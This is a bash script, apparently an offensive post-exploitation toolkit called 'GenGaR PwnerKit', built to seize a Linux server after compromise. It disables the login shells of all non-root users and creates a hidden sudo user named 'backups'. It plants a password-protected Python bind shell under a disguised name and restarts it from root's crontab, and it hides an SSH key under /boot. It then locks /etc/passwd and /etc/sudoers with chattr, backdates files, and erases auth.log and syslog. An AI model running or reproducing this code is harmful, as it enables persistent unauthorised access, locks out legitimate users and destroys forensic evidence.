#!/usr/bin/env bash

mv ./gpk /bin/gpk 2>/dev/null
touch -t 201801120000 /bin/gpk 2>/dev/null

    red='\033[33;31m'
    green='\033[33;32m'
    blue='\033[33;34m'
    white='\033[1;37m'
    purple='\033[1;35m'

echo -e "
$purple
          ╔════════════════════════════════════════════════════════════════╗
          ║        ________                           __________           ║
          ║       /  _____/  ____   ____    _________ \______   \          ║ 
          ║      /   \  ____/ __ \ /    \  / ___\__  \ |       _/          ║
          ║      \    \_\  \  ___/|   |  \/ /_/  > __ \|    |   \          ║
          ║       \______  /\___  >___|  /\___  (____  /____|_  /          ║
          ║              \/     \/     \//_____/     \/       \/           ║
          ║    __________                             ____  __.__  __      ║
          ║    \______   \__  _  ______   ___________|    |/ _|__|/  |_    ║
          ║     |     ___/\ \/ \/ /    \_/ __ \_  __ \      < |  \   __\   ║
          ║     |    |     \     /   |  \  ___/|  | \/    |  \|  ||  |     ║
          ║     |____|      \/\_/|___|  /\___  >__|  |____|__ \__||__|     ║
          ║                           \/     \/              \/            ║
          ║                            By H0ru                             ║
          ║                                                                ║
          ╚════════════════════════════════════════════════════════════════╝
"


echo -e "$blue Proceed?
      [?] y or ENTER to continue
      [?] n to exit"
         read -p " [y/n]: " ANSWER
         test "$ANSWER" = "n" && echo -e "$white" && exit
         clear

    testpython=$(command -v python3 >/dev/null 2>&1 && echo -e "$green Installed!" || echo -e "$red Not Installed!")

    echo -e "$blue
    ┌──────────────────────────────────────────┐
    │         Python3 checker to GPK           │
    ├────────────────────┬─────────────────────┘
    │       Status:      │    [$testpython$blue ]
    └────────────────────┘   
    "
   
    test_python=$(command -v python3 >/dev/null 2>&1 && echo -e "$Installed!" || echo -e "Not Installed!")

    test "$test_python" = "Not Installed!" && echo -e "$white" && exit


echo -e "$blue Proceed?
      [?] y or ENTER to continue
      [?] n to exit"
         read -p " [y/n]: " ANSWER
         test "$ANSWER" = "n" && echo -e "$white" && exit
         clear


echo -e "$purple
  ⠀⠀⠀⠀⠀⢸⠓⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠀⠀⢸⠀⠀⠑⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   
  ⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠙⢤⡷⣤⣦⣀⠤⠖⠚⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀   
  ⣠⡿⠢⢄⡀⠀⡇⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠸⠷⣶⠂⠀⠀⠀⣀⣀⠀⠀⠀   
  ⢸⣃⠀⠀⠉⠳⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⢉⡭⠋     
  ⠀⠘⣆⠀⠀⠀⠁⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀ [~] H3ll0 $(whoami)!  
  ⠀⠀⠘⣦⠆⠀⠀⢀⡎⢹⡀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⡀⣠⠔⠋⠀⠀⠀⠀ [~] Y0ur p0w3r: $(id | cut -d ' ' -f1 | cut -d '=' -f2)
  ⠀⠀⠀⡏⠀⠀⣆⠘⣄⠸⢧⠀⠀⠀⠀⢀⣠⠖⢻⠀⠀⠀⣿⢥⣄⣀⣀⣀⠀⠀ [~] L3t'$ g0 pwn?
  ⠀⠀⢸⠁⠀⠀⡏⢣⣌⠙⠚⠀⠀⠠⣖⡛⠀⣠⠏⠀⠀⠀⠇⠀⠀⠀⠀⢙⣣⠄ 
  ⠀⠀⢸⡀⠀⠀⠳⡞⠈⢻⠶⠤⣄⣀⣈⣉⣉⣡⡔⠀⠀⢀⠀⠀⣀⡤⠖⠚⠀⠀   
  ⠀⠀⡼⣇⠀⠀⠀⠙⠦⣞⡀⠀⢀⡏⠀⢸⣣⠞⠀⠀⠀⡼⠚⠋⠁⠀⠀⠀⠀⠀   
  ⠀⢰⡇⠙⠀⠀⠀⠀⠀⠀⠉⠙⠚⠒⠚⠉⠀⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⢧⡀⠀⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠙⣶⣶⣿⠢⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠀⠀⠉⠀⠀⠀⠙⢿⣳⠞⠳⡄⠀⠀⠀⢀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠹⣄⣀⡤⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"

echo -e "$white"

PS3="MODE: "
type=(
"INFO"
"PWN"
"BACKDOOR"
"SSH CONFIG" 
"SSH KEYS" 
"RESTART SSH" 
"HARDENING" 
"CLEAR" 
"EXIT" 
)
 select var in "${type[@]}"; do
  case $var in

"INFO")
echo -e "$blue Proceed?
      [?] y or ENTER to continue
      [?] n to exit"
         read -p " [y/n]: " ANSWER
         test "$ANSWER" = "n" && echo -e "$white" && exit

    #Info:
    echo -e "

    ┌──────────────────────────────────────────┐
    │              Informations:               │
    └──────────────────────────────────────────┘

    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
   $green [+] SystemInfo:
   $white $(uname -mrs; cat /etc/*release)


   $green [+] About me:
   $white $(id || (whoami && groups) 2>/dev/null)


   $green [+] Path:
   $white $PATH


   $green [+] Sudo:
   $white $(sudo -V| head -n1)


   $green [+] Super Users:
   $white $(awk -F: '($3 == "0") {print}' /etc/passwd)


   $green [+] Shell Users:
   $white $(cat /etc/passwd | grep "sh$")


   $green [+] Partitions:
   $white $(df -h || lsblk)


   $green [+] Crontab:
   $white $(cat /etc/crontab)


   $green [+] Tools find: $white"
which chattr curl wget perl php python python2 python2.7 python3 python3.6 python3.7 docker lxc doas sudo socat sshd service systemctl systemd nc ncat netcat nmap gcc g++ make pkexec tmux xterm aws kubectl
                ;;
 "PWN")
echo -e "$blue Proceed?
      [?] y or ENTER to continue
      [?] n to exit"
         read -p " [y/n]: " ANSWER
         test "$ANSWER" = "n" && echo -e "$white" && exit

         echo -e "$white"

    #NoBASH+PWN:
                sed -i "/root/!s/bash/false/g" /etc/passwd
                name=backups
                echo -e "$white [+] User: backups"
                read -p " [+] Password: " password
                echo -ne "$password\n$password\n\n\n\n" | adduser $name 2>/dev/null
                echo -ne "\n$name   ALL=(ALL:ALL) ALL\n" >> /etc/sudoers
                rm -rf /var/backups 2>/dev/null
                mv /home/backups /var/backups
                sed -i 's/:\/home\/backups:/:\/var\/backups:/g' /etc/passwd
                shred -fuz /var/backups/.bash_history 2>/dev/null
                ln -s /dev/null /var/backups/.bash_history
                touch -t 201912250000 /var/backups/
                echo "[Backup User Created!]"
                ;;
 
 "BACKDOOR")
echo -e "$blue Proceed?
      [?] y or ENTER to continue
      [?] n to exit"
         read -p " [y/n]: " ANSWER
         test "$ANSWER" = "n" && echo -e "$white" && exit

         echo -e "$white"

    #BACKDOOR:
cat << 'EOF' > /usr/lib/networker
#!/usr/bin/env python3
import socket
import os
import subprocess
import traceback
import threading
from socket import error as SocketError
import errno
LOCALHOST = '0.0.0.0' 
PORT = DOOR
banner = (b"""
          NETWORK SYSTEM
""")
class ClientThread(threading.Thread):
    def __init__(self,clientAddress,clientsocket):
        threading.Thread.__init__(self)
        self.csocket = clientsocket
    def run(self):
        while True:
            self.csocket.send(banner)
            while True:
                data = self.csocket.recv(1024)
                if data.decode() == "PASSWORD\n":
                    self.csocket.send(b"Right!\n")
                    while True:
                        data = self.csocket.recv(1024)
                        self.csocket.send(b"Command: " + data)
                        command = data.decode()
                        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
                        output = proc.stdout.read()
                        self.csocket.send(bytes(output))
                else:
                    self.csocket.send(b"Error!\n")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((LOCALHOST, PORT))
while True:
    s.listen(1000)
    clientsock, clientAddress = s.accept()
    newthread = ClientThread(clientAddress, clientsock)
    newthread.start()
EOF


read -p "Your listening port: " DOOR


sed -i "s/DOOR/$DOOR/" /usr/lib/networker


read -p "Your password: " PASSWORD


sed -i "s/PASSWORD/$PASSWORD/" /usr/lib/networker


python3 -m py_compile /usr/lib/networker


mv /usr/lib/__pycache__ /usr/lib/networks


mv /usr/lib/networks/networkercpython* /usr/lib/networks/networker.proc


rm /usr/lib/networker


cat << 'EOF' > /etc/security/system.conf
#!/usr/bin/env bash
while :
do
    /usr/bin/python3 /usr/lib/networks/networker.proc
    sleep 5
done
EOF


chmod u+x /etc/security/system.conf


echo "* * * * * root  /usr/bin/env bash /etc/security/system.conf" >> /etc/crontab        

          echo -e "$white[Opened!]" 
               ;;
"SSH CONFIG")
echo -e "$blue Proceed?
      [?] y or ENTER to continue
      [?] n to exit"
         read -p " [y/n]: " ANSWER
         test "$ANSWER" = "n" && echo -e "$white" && exit

#SSHCONFIG:

           echo -e "$white"

           sed -i 's/^.Port.*/Port 59639/' /etc/ssh/sshd_config;

           sed -i 's/Port.*/Port 59639/' /etc/ssh/sshd_config;
           
           sed -i 's/^.MaxAuthTries.*/MaxAuthTries 3/' /etc/ssh/sshd_config;

           sed -i 's/MaxAuthTries.*/MaxAuthTries 3/' /etc/ssh/sshd_config;

           sed -i 's/^.MaxSessions.*/MaxSessions 3/' /etc/ssh/sshd_config;

           sed -i 's/MaxSessions.*/MaxSessions 3/' /etc/ssh/sshd_config;

           sed -i 's/^.PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config;

           sed -i 's/PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config;
                      
           sed -i 's/^.ChallengeResponseAuthentication.*/ChallengeResponseAuthentication no/' /etc/ssh/sshd_config;
           
           sed -i 's/ChallengeResponseAuthentication.*/ChallengeResponseAuthentication no/' /etc/ssh/sshd_config; 

           sed -i 's/^.UsePAM.*/UsePAM no/' /etc/ssh/sshd_config;

           sed -i 's/UsePAM.*/UsePAM no/' /etc/ssh/sshd_config; 
           
           echo "AllowUsers backups" >> /etc/ssh/sshd_config;

           echo "DenyUsers root" >> /etc/ssh/sshd_config;
           
           echo "[SSH Configurated!]"    
               ;;
"SSH KEYS")
echo -e "$blue Proceed?
      [?] y or ENTER to continue
      [?] n to exit"
         read -p " [y/n]: " ANSWER
         test "$ANSWER" = "n" && echo -e "$white" && exit

#MYSSHKEY:
          
          echo -e "$white"

          echo "Creating SSH Directory:"

          read -p "[+] SSH-KEY:  " key

          echo $key >> /boot/model-generic

          chown backups:backups /boot/model-generic
          
          touch -t 201910280000 /boot/model-generic
          
          chmod 0600 /boot/model-generic

          echo "AuthenticationMethods publickey" >> /etc/ssh/sshd_config;

          sed -i 's/^.AuthorizedKeysFile.*/AuthorizedKeysFile \/boot\/model-generic/g' /etc/ssh/sshd_config;
           
          sed -i 's/AuthorizedKeysFile.*/AuthorizedKeysFile \/boot\/model-generic/g' /etc/ssh/sshd_config;

          sed -i 's/^.PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config;
           
          sed -i 's/PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config;

          sed -i 's/^.PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config;
           
          sed -i 's/PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config;

          sed -i 's/^.PermitEmptyPasswords.*/PermitEmptyPasswords no/' /etc/ssh/sshd_config;

          sed -i 's/PermitEmptyPasswords.*/PermitEmptyPasswords no/' /etc/ssh/sshd_config; 

          echo "[SSH Key Configurated!]
"  
               ;;
"RESTART SSH")
echo -e "$blue Proceed?
      [?] y or ENTER to continue
      [?] n to exit"
         read -p " [y/n]: " ANSWER
         test "$ANSWER" = "n" && echo -e "$white" && exit

         echo -e "$white"

#RESTARTSSH:
            service ssh restart;

            systemctl restart ssh;

            systemctl restart ssh.service;

            echo "[SSH Restarted!]"
               ;;
"HARDENING")
echo -e "$blue Proceed?
      [?] y or ENTER to continue
      [?] n to exit"
         read -p " [y/n]: " ANSWER
         test "$ANSWER" = "n" && echo -e "$white" && exit

         echo -e "$white"

         #SUDOERS:

         touch -t 201910280000 /etc/sudoers

         chmod 400 /etc/sudoers

         chattr +i /etc/sudoers

         echo "[SUDOERS Locked!]"

         #PASSWD:

         touch -t 201910280000 /etc/passwd

         chmod 400 /etc/passwd;

         chattr +i /etc/passwd;
 
         echo "[PASSWD Locked!]"

         #NOEDITSSH:

         touch -t 201910280000 /boot/model-generic

         chmod 400 /etc/ssh/sshd_config;
           
         chattr +i /etc/ssh/sshd_config;

         chattr +i /boot/model-generic

         echo "[SSH Locked!]"

         echo -e "[All Locked!]"
               ;;
"CLEAR")
        clear
echo -e "$purple [?] PRESS ENTER"

echo -e "$white"

               ;;
"EXIT")
export HISTFILE=/dev/null
    cat /dev/null > /var/log/auth.log
    cat /dev/null > /var/log/syslog
echo -e "$white"
       exit
               ;;
    esac
done
